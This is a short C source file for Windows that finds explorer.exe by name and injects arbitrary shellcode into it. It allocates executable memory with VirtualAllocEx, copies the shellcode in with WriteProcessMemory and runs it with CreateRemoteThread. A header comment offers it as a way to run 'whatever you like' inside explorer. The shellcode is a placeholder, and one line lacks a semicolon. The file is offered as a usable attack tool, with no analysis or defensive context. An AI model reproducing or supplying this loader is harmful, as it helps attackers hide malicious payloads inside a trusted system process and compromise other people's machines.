//This grabs the PID of exploere and executes whatever you like into it. Make sure this is compiled in X64 and the shell code is X64 as well othewise...
//the source process will crash and cause you code to not execute.

#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

DWORD GetProcessIdByName(const char* processName) {
    DWORD pid = 0;
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 pe32;
        pe32.dwSize = sizeof(PROCESSENTRY32);
        if (Process32First(hSnapshot, &pe32)) {
            do {
                if (strcmp(pe32.szExeFile, processName) == 0) {
                    pid = pe32.th32ProcessID;
                    break;
                }
            } while (Process32Next(hSnapshot, &pe32));
        }
        CloseHandle(hSnapshot);
    }
    return pid;
}

int main() {
    char shellcode[] = "urshellcode"
    
    DWORD pid = GetProcessIdByName("explorer.exe");
    if (pid == 0) {
        printf("Process not found\n");
        return 1;
    }
    printf("Process id: %d\n", pid);
    Sleep(1000);

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (hProcess == NULL) {
        printf("OpenProcess failed\n");
        return 1;
    }
    Sleep(1000);

    LPVOID lpBaseAddress = VirtualAllocEx(hProcess, NULL, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (lpBaseAddress == NULL) {
        printf("VirtualAllocEx failed\n");
        return 1;
    }
    Sleep(1000);

    SIZE_T lpNumberOfBytesWritten;
    BOOL bRet = WriteProcessMemory(hProcess, lpBaseAddress, shellcode, sizeof(shellcode), &lpNumberOfBytesWritten);
    if (bRet == FALSE) {
        printf("WriteProcessMemory failed\n");
        return 1;
    }
    Sleep(1000);

    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)lpBaseAddress, NULL, 0, NULL);
    if (hThread == NULL) {
        printf("CreateRemoteThread failed\n");
        return 1;
    }

    printf("Worked!\n");

    Sleep(1000);

    return 0;
}

